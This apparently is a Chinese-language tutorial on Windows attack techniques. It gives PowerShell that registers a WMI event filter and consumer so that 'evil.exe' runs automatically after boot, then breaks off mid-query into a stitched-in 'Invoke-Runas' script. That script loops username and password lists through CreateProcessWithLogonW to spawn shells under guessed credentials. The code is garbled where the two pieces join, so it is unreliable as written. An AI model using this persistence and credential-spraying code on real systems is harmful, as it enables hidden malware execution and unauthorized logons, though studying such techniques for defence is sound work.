  1. 事件筛选器
事件筛选器是什么呢？事件筛选器描述事件并且执行WQL事件查询。
  2. 事件消费者
事件消费者是什么呢？事件消费是一个派生自 __EventConsumer 系统类的类，它表示了在事件触发时的动作。我们常用的消费类有下面两个：
    1. ActiveScriptEventConsumer – 执行嵌入的 VBScript 或 JScript 脚本 payload
    2. CommandLineEventConsumer – 执行一个命令行程序
  3. 消费者绑定筛选器
消费者绑定筛选器？消费者绑定筛选器就是将筛选器绑定到消费者的注册机制。
#### 实例代码
下面我们分析一个实例代码：其中第5个变量为事件筛选器、第6个变量为事件消费者、最后一个就是绑定事件筛选器和事件消费者，也就是通俗理解的执行。这个脚本能达到什么效果呢？事件筛选器在系统启动后的
200 和 320 秒之间被当作一个触发器。在事件被触发时事件消费者会使用`CommandLineEventConsumer`执行已指定好的可执行文件。
    $filterName='BotFilter82'
    ​
    $consumerName='BotConsumer23'
    ​
    $exePath='C:WindowsSystem32evil.exe'
    ​
    $Query=”SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance 
    ISA 'Win32_PerfFormattedData_PerfOS_System' AND 
    TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime  LOGON_WITH_PROFILE
                                               Log on, then load the user profile in the HKEY_USERS registry
                                               key. The function returns after the profile is loaded.
                              0x00000002 --> LOGON_NETCREDENTIALS_ONLY (= /netonly)
                                               Log on, but use the specified credentials on the network only.
                                               The new process uses the same token as the caller, but the
                                               system creates a new logon session within LSA, and the process
                                               uses the specified credentials as the default credentials.
         -Binary            Full path of the module to be executed.
         -Args              Arguments to pass to the module, e.g. "/c calc.exe". Defaults
                            to $null if not specified.
    ​
    .EXAMPLE
        Start cmd with a local account
        C:PS> Invoke-Runas -UserList SomeAccountList -PasswordList SomePassList -Binary C:WindowsSystem32cmd.exe -LogonType 0x1
    .EXAMPLE
        Start cmd with remote credentials. Equivalent to "/netonly" in runas.
        C:PS> Invoke-Runas -UserList SomeAccountList -PasswordList SomePassList -Domain SomeDomain -Binary C:WindowsSystem32cmd.exe -LogonType 0x2
    #>
    ​
        param (
            [Parameter(Mandatory = $True)]
            [string]$UserList,
            [Parameter(Mandatory = $True)]
            [string]$PasswordList,
            [Parameter(Mandatory = $False)]
            [string]$Domain=".",
            [Parameter(Mandatory = $True)]
            [string]$Binary,
            [Parameter(Mandatory = $False)]
            [string]$Args=$null,
            [Parameter(Mandatory = $True)]
            [int][ValidateSet(1,2)]
            [string]$LogonType
        )  
    ​
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        public static class Advapi32
        {
            [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
            public static extern bool CreateProcessWithLogonW(
                String userName,
                String domain,
                String password,
                int logonFlags,
                String applicationName,
                String commandLine,
                int creationFlags,
                int environment,
                String currentDirectory,
                ref  STARTUPINFO startupInfo,
                out PROCESS_INFORMATION processInformation);
        }
        public static class Kernel32
        {
            [DllImport("kernel32.dll")]
            public static extern uint GetLastError();
        }
    "@
    ​
        # StartupInfo Struct
        $StartupInfo = New-Object STARTUPINFO
        $StartupInfo.dwFlags = 0x00000001
        $StartupInfo.wShowWindow = 0x0001
        $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
        # ProcessInfo Struct
        $ProcessInfo = New-Object PROCESS_INFORMATION
        # 创建一个在当前目录的shell
        $GetCurrentPath = (Get-Item -Path "." -Verbose).FullName
        echo "`n[>] Calling Advapi32::CreateProcessWithLogonW"
    ​
        $usernames = Get-Content -ErrorAction SilentlyContinue -Path $UserList
        $passwords = Get-Content -ErrorAction SilentlyContinue -Path $PasswordList
        if (!$usernames) { 
            $usernames = $UserList
            Write-Verbose "UserList file does not exist."
            Write-Verbose $usernames
        }
        if (!$passwords) {
            $passwords = $PasswordList
            Write-Verbose "PasswordList file does not exist."
            Write-Verbose $passwords
        }